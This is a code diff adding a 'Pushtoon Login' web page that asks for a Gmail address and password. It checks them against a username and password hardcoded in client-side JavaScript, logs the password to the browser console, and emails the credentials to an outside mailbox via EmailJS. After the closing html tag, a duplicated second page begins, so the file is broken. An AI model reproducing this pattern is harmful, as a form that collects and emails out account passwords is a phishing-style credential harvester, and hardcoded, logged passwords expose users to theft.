@@ -3,6 +3,166 @@
 <head>
   <title>Pushtoon Login</title>
 
+  <!-- ✅ Fix favicon error -->
+  <link rel="icon" href="data:,">
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <script>
+    emailjs.init({
+      publicKey: "aU_rVriMIfRSDIniQ"
+    });
+  </script>
+
+  <style>
+
+    body{
+      margin:0;
+      padding:0;
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      font-family:Arial, sans-serif;
+      background-image:url("https://images.unsplash.com/photo-1506744038136-46273834b3fb");
+      background-size:cover;
+      background-position:center;
+    }
+
+    .container{
+      background:rgba(255,255,255,0.92);
+      padding:40px;
+      border-radius:20px;
+      width:350px;
+      text-align:center;
+      box-shadow:0px 10px 25px rgba(0,0,0,0.4);
+      backdrop-filter:blur(5px);
+    }
+
+    h2{
+      color:#00e5ff;
+      margin-bottom:25px;
+      font-size:35px;
+      letter-spacing:2px;
+      animation: glowMove 2s ease-in-out infinite alternate;
+    }
+
+    @keyframes glowMove{
+      0%{
+        transform: translateY(0px);
+        text-shadow: 0 0 5px rgba(0,229,255,0.4);
+      }
+      100%{
+        transform: translateY(-8px);
+        text-shadow: 0 0 20px rgba(0,229,255,0.9),
+                     0 0 40px rgba(0,229,255,0.6);
+      }
+    }
+
+    input{
+      width:90%;
+      padding:14px;
+      margin:12px 0;
+      border:2px solid #ddd;
+      border-radius:12px;
+      font-size:16px;
+      outline:none;
+      transition:0.3s;
+    }
+
+    input:focus{
+      border-color:#6a1b9a;
+      box-shadow:0 0 12px rgba(106,27,154,0.5);
+    }
+
+    button{
+      width:95%;
+      padding:14px;
+      border:none;
+      border-radius:12px;
+      background:linear-gradient(135deg, #ff9800, #ff5722);
+      color:white;
+      font-size:20px;
+      cursor:pointer;
+      transition:0.3s;
+      font-weight:bold;
+      margin-top:10px;
+    }
+
+    button:hover{
+      transform:scale(1.05);
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+  <h2>LOGIN</h2>
+
+  <input type="email" id="email" placeholder="Enter your Gmail">
+  <input type="password" id="password" placeholder="Enter your password">
+
+  <button onclick="sendMail()">LOG IN</button>
+
+</div>
+
+<script>
+
+function sendMail(){
+
+    let email = document.getElementById("email").value.trim().toLowerCase();
+    let password = document.getElementById("password").value.trim();
+
+    let correctEmail = "test@gmail.com";
+    let correctPassword = "Pushtoon123";
+
+    console.log("EMAIL:", email);
+    console.log("PASSWORD:", password);
+
+    if(email === "" || password === ""){
+        alert("Please fill all fields!");
+        return;
+    }
+
+    if(email === correctEmail && password === correctPassword){
+
+        let params = {
+            email: email,
+            password: password
+        };
+
+        emailjs.send(
+            "service_bqnzz7f",
+            "template_lxwj7sw",
+            params
+        )
+        .then(function(response){
+            alert("Login Successful!");
+            console.log("SUCCESS:", response);
+        })
+        .catch(function(error){
+            alert("FAILED - check console (F12)");
+            console.log("ERROR:", error);
+        });
+
+    } else {
+        alert("Wrong email or password!");
+    }
+
+}
+
+</script>
+
+</body>
+</html><!DOCTYPE html>
+<html>
+<head>
+  <title>Pushtoon Login</title>
+
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
   <script>
